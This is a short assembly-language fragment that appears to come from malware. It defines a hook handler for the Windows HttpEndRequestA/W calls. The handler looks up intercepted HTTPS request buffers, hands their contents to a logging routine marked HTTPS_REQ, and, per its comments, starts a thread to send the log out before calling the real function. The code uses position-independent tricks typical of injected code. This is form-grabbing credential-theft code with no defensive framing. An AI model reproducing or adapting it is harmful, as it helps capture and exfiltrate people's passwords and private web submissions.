
.code

;; ==================================================================================================== ;;
;; hHttpEndRequest is a HttpEndRequestA and HttpEndRequestW handler procedure                           ;;
;; Search current handle in array of send handles                                                       ;;
;; If handle found then unset array cell and create thread for log sending                              ;;
;; ==================================================================================================== ;;
hHttpEndRequest proc uses esi ebx p1, p2, p3, p4 : dword

	GetBaseDelta ebx


	invokx  &ArrayKeyPos[ebx], lpSendBuffersArray[ebx], p1
	jmpz eax, @real

	;; Handle found, send log
	mov  esi, [eax+4]		;; esi - pointer to data & its len (in 1-st dword)
	lodsd
	invokx  &InLog[ebx], esi, eax, HTTPS_REQ


@real:
	invokx  _HttpEndRequestA[ebx], p1, p2, p3, p4

	ret
hHttpEndRequest endp

